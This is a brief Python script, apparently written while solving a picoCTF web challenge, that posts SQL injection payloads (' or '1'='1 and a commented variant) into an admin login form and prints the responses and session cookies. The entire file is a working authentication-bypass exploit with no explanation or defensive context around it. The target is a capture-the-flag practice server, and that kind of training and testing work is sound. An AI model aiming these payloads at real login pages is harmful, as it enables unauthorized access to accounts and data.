import requests
base = 'http://wily-courier.picoctf.net:49463'

# Full response for the interesting length 3311
s = requests.Session()
r = s.post(base, data={'name': 'admin', 'pass': "' or '1'='1"})
print('LENGTH 3311 RESPONSE:')
print(r.text)
print('='*80)

# Full response for short length 265
s2 = requests.Session()
r2 = s2.post(base, data={'name': 'admin', 'pass': "' or '1'='1' --"})
print('LENGTH 265 RESPONSE:')
print(r2.text)
print('='*80)
print('Cookies:', dict(s.cookies), dict(s2.cookies))